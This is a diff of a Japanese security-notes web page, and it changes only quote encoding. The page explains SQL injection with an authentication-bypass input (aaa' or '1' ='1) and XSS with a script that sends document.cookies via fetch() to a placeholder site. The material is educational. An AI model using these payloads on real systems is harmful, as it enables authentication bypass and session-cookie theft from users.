@@ -34712,7 +34712,7 @@
 <p><img alt="SQLインジェクション" src="https://raw.githubusercontent.com/hiroki-it/tech-notebook-images/master/images/SQLインジェクション.jpg" /></p>
 <h4 id="_4">▼ 攻撃例<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h4>
 <p>例えば、アプリケーションの認証ロジックに以下のような SQL があるとする。</p>
-<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">USER</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">USER_NAME</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;{user_name}&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">PASSWORD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;{password}&#39;</span>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">USER</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">USER_NAME</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'{user_name}'</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">PASSWORD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'{password}'</span>
 </code></pre></div>
 <p>このとき、ログインの入力フォームに以下を入力する。</p>
 <ul>
@@ -34720,7 +34720,7 @@
 <li>パスワード： <code>aaa' or '1' ='1</code></li>
 </ul>
 <p>これにより、以下の Read 処理を実行することになる。</p>
-<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">USER</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">USER_NAME</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;foo&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">PASSWORD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;aaa&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="w"> </span><span class="o">=</span><span class="s1">&#39;1&#39;</span>
+<div class="highlight"><pre><span></span><code><span class="k">SELECT</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">USER</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">USER_NAME</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'foo'</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="k">PASSWORD</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'aaa'</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="s1">'1'</span><span class="w"> </span><span class="o">=</span><span class="s1">'1'</span>
 </code></pre></div>
 <p>この SQL は、<code>'1' ='1'</code> により <code>true</code> となり、処理に成功してしまう。</p>
 <blockquote>
@@ -34740,7 +34740,7 @@
   <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>
     今日の気分は
     <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-<span class="w">      </span><span class="nx">fetch</span><span class="p">(</span><span class="s2">&quot;https://&lt;Cookieの送信先サイト&gt;/?cookie_data=&quot;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookies</span><span class="p">);</span>
+<span class="w">      </span><span class="nx">fetch</span><span class="p">(</span><span class="s2">"https://&lt;Cookieの送信先サイト&gt;/?cookie_data="</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">cookies</span><span class="p">);</span>
 <span class="w">    </span><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
     だよ
   <span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
